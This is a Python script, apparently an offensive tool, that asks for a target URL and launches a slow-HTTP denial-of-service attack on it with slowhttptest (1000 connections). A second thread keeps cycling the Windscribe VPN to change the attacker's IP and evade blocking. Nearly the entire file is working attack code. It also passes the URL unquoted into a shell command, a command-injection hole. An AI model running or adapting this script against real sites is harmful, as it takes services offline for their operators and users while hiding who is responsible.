import os
import time
import threading

#By: Revers3 Everything 27 Sep 2024
#Authors: Danilo Erazo, Anthony Lopez

# Función para ejecutar slowhttptest en una ventana tmux
def run_slowhttptest(url):
    try:
        # Verifica si tmux está instalado
        if os.system("which tmux") != 0:
            print("Error: tmux no está instalado.")
            return
        
        # Crea una nueva sesión de tmux y ejecuta slowhttptest
        tmux_command = f"tmux new-session -d -s slowhttptest_session 'slowhttptest -c 1000 -H -g -i 10 -r 200 -t GET -u {url} -x 24 -p 3'"
        os.system(tmux_command)
        print(f"slowhttptest iniciado en tmux. URL objetivo: {url}")
        
        # Mantiene la ventana abierta para ver la ejecución
        os.system("tmux attach-session -t slowhttptest_session")
    except Exception as e:
        print(f"Ocurrió un error en slowhttptest: {e}")

# Función para cambiar la IP usando Windscribe en una ventana tmux
def change_ip():
    try:
        # Crea una nueva sesión de tmux para Windscribe
        os.system("tmux new-session -d -s windscribe_session 'bash'")
        print("Sesión de Windscribe iniciada en tmux.")

        while True:
            # Conectar a Windscribe
            os.system("tmux send-keys -t windscribe_session 'windscribe connect' C-m")
            print("Connected to Windscribe.")
            time.sleep(10)

            # Desconectar de Windscribe
            os.system("tmux send-keys -t windscribe_session 'windscribe disconnect' C-m")
            print("Disconnected de Windscribe.")
            time.sleep(2)  # Pausa pequeña antes de reconectar

        # Mantiene la ventana de windscribe abierta
        os.system("tmux attach-session -t windscribe_session")
    except Exception as e:
        print(f"Ocurrió un error al cambiar la IP con Windscribe: {e}")

if __name__ == "__main__":
    # Entrada del usuario para la URL
    url = input("Enter the WEB URL to attack: ").strip()

    # Crear hilos para ejecutar las dos funciones en paralelo
    thread1 = threading.Thread(target=run_slowhttptest, args=(url,))
    thread2 = threading.Thread(target=change_ip)

    # Iniciar ambos hilos
    thread1.start()
    thread2.start()

    # Esperar a que ambos hilos terminen (opcional, si deseas que el programa espere)
    thread1.join()
    thread2.join()

    os.system("windscribe disconnect")
